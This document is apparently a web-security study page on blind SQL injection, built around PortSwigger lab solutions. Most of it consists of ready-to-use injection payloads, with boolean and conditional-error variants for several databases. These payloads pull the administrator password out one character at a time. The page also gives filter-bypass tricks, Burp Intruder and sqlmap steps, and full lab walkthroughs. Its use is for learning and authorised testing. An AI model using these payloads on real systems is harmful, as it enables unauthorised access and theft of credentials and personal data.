# SQL injection - Blind (boolean & conditional-error)

The query runs but its results never reach the response. You extract data one bit per request by making a **detectable difference** depend on a single true/false condition - either a content change (a "Welcome back" banner) or a conditionally-triggered DB error. Slow but total: you can read any value the DB user can read. Max impact: full creds/PII extraction with zero data in the response.

## Quick reference

```
-- oracle check (boolean)
xyz' AND '1'='1          -> true  (marker present)
xyz' AND '1'='2          -> false (marker absent)
-- confirm table/user
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-- password length
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
-- char by char (boolean)
xyz' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='administrator')='X
-- conditional ERROR variant (Oracle), when content never changes:
xyz'||(SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
xyz'||(SELECT CASE WHEN SUBSTR(password,N,1)='X' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Decision list:
- Content differs on true vs false (banner appears/disappears) -> **boolean** (conditional responses).
- Content identical regardless, but you can force an error that changes the response (500 vs 200) -> **conditional error**.
- Neither differs -> escalate to `../Blind-time-based/` then `../Out-of-band-OAST/`.

## Root cause
Injection into a query whose row result is used internally (e.g. "is this a known tracking cookie?") but not echoed. The app's behavior still branches on whether the query returns rows or errors - that branch is your oracle.

## Find it (recon and detection)
- Spot a value used for a lookup that yields a subtle UI difference: a "Welcome back" message, a different status, a cookie set, content present/absent. Common: `TrackingId` cookie, analytics/session lookups, "remember me" tokens.
- **Establish the oracle:** append `' AND '1'='1` (expect the true-state) and `' AND '1'='2` (expect the false-state). A reliable difference = exploitable boolean oracle.
- For conditional-error: append `'` (error), `''` (no error) to prove SQL syntax sensitivity, then build a CASE that divides by zero only when your condition is true.

## Technique
**Boolean (conditional responses):**
1. Confirm oracle with `AND '1'='1` vs `'1'='2`.
2. Confirm target rows: `AND (SELECT 'a' FROM users WHERE username='administrator')='a'` (true ⇒ user exists).
3. Find password length: increment `AND ... LENGTH(password)>N` until it flips false ⇒ length = last true N.
4. Extract each char: `AND (SELECT SUBSTRING(password,i,1) FROM users WHERE username='administrator')='X'`, cycle `X` over `a-z0-9` for each position `i`. (Use `>` comparisons for binary search to cut requests ~6x.)

**Conditional error (when content never changes):**
1. Prove SQL: `'` -> error, `''` -> no error.
2. Build a valid subquery: Oracle needs a table - `'||(SELECT '' FROM dual)||'` valid; `'||(SELECT '' FROM not-a-real-table)||'` errors (confirms processing).
3. Confirm rows without breaking concat: `'||(SELECT '' FROM users WHERE ROWNUM=1)||'` (ROWNUM=1 keeps it single-row).
4. Conditional error: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> error when true.
5. Extract: `'||(SELECT CASE WHEN SUBSTR(password,i,1)='X' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` - HTTP 500 row in Intruder = correct char.

**Advanced / edge cases:**
- **Binary search** instead of equality: `SUBSTRING(...) > 'm'` halves the search space per request - far faster than 36-way equality.
- **ASCII compare:** `ASCII(SUBSTRING(password,i,1)) > 109` works where char compares are awkward; extends to any charset.
- **DB-specific substring:** `SUBSTRING` (MySQL/MSSQL/PG), `SUBSTR` (Oracle/PG). Length: `LENGTH` (most), `LEN` (MSSQL).
- **Conditional-error CASE by DB:** Oracle `TO_CHAR(1/0)`; MSSQL `1/0`; Postgres `1/(SELECT 0)`; MySQL `(SELECT table_name FROM information_schema.tables)` in IF.
- **Cookie injection nuance:** the value sits in an HTTP header - spaces are fine in a real request (Burp Repeater); only URL-encode reserved cookie chars. (When scripting via JS you must work around HttpOnly + the Cookie forbidden-header rule - Burp Repeater avoids this entirely, which is why it's the intended tool.)

## Payload arsenal
```sql
-- boolean oracle + extraction (PostgreSQL/MySQL/MSSQL)
' AND '1'='1                 ' AND '1'='2
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='s
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'m'   -- binary search
-- conditional error (Oracle)
'||(SELECT '' FROM dual)||'
'||(SELECT '' FROM users WHERE ROWNUM=1)||'
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- conditional error (MSSQL / Postgres / MySQL)
' AND 1=(SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END)--                    -- MSSQL
' AND 1=(SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)--           -- Postgres-ish
' AND (SELECT IF(COND,(SELECT table_name FROM information_schema.tables),'a'))='a   -- MySQL
```

## Bypasses
| Blocker | Bypass |
|---|---|
| no content difference | switch boolean -> conditional error -> time delay -> OAST |
| `SUBSTRING` filtered | `SUBSTR`, `MID()` (MySQL), `ASCII(...)` slicing |
| equality `=` filtered | use `>` / `<` (binary search), `LIKE` |
| spaces filtered | `/**/`, `%0a`; inline comments |
| char limit on the field | conditional error uses fewer chars than full UNION; or delete the cookie's original value to free bytes |

## Exploitation walkthrough (boolean, TrackingId cookie)
1. Cookie `TrackingId=xyz' AND '1'='1` -> "Welcome back" shown (true). `...'1'='2` -> not shown (false). Oracle established.
2. `...xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` -> true ⇒ admin exists.
3. Ladder `LENGTH(password)>N` in Burp Repeater -> flips false at 21 ⇒ **20 chars**.
4. Send to Burp Intruder; payload position on the compared char: `...SUBSTRING(password,§1§,1)...='§a§'` (cluster bomb: position 1-20 x charset a-z0-9). The 200-with-banner row gives each char.
5. Reassemble password, log in as administrator -> solved.

## Chaining
- Output is creds -> [Authentication](../../Authentication/) / [Access-control](../../Access-control/).
- Same oracle pattern recurs in [NoSQL-injection](../../NoSQL-injection/) (boolean) and blind [XXE](../../XXE-injection/).

## Tools
- **Burp Repeater:** confirm oracle, find length.
- **Burp Intruder:** cluster-bomb positionxchar; sort by status/length/presence-of-banner. Use grep-match on "Welcome back".
- **sqlmap:** `--technique=B` (boolean) / `E` (error) automates the whole extraction.

## Labs

### Lab: Blind SQL injection with conditional responses [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
- Method: `TrackingId` cookie. `' AND '1'='1` shows "Welcome back", `'1'='2` doesn't. Confirm users table & administrator via `(SELECT 'a' FROM users WHERE username='administrator')='a`. Find length with `LENGTH(password)>N` (=20). Intruder `SUBSTRING(password,i,1)='§§'` over a-z0-9 per position; the "Welcome back" row = the char. Log in.
- Insight: the banner is the boolean oracle; SUBSTRING + position sweep reads the password.
- Real-target transfer: any lookup value with a subtle true/false UI tell (tracking cookie, "remember me", search hit count).

### Lab: Blind SQL injection with conditional errors [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
- Method: content never changes, so use errors. `'` errors, `''` doesn't. Build valid Oracle subquery (`'||(SELECT '' FROM dual)||'`), confirm `users`/`administrator` via `... FROM users WHERE ROWNUM=1`, then `CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE '' END`. Length via `LENGTH(password)>N`; chars via `SUBSTR(password,i,1)='X'` -> HTTP 500 = match. Log in.
- Insight: a conditional divide-by-zero turns "no visible difference" into a 500-vs-200 oracle. ROWNUM=1 keeps concatenation single-row.
- Real-target transfer: when boolean content is identical, force a conditional error; the 500 is your bit.

## Real-world notes
- Blind extraction is noisy (hundreds-thousands of requests) - on live targets, prove the oracle and extract a single benign value (e.g. `@@version` or a length), not the whole user table.
- CVSS: same data-breach impact as visible SQLi (High-Critical); the only difference is effort.
- False positive: a "difference" that's actually caching/randomness - re-test true/false several times before trusting the oracle.

## References
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection/cheat-sheet
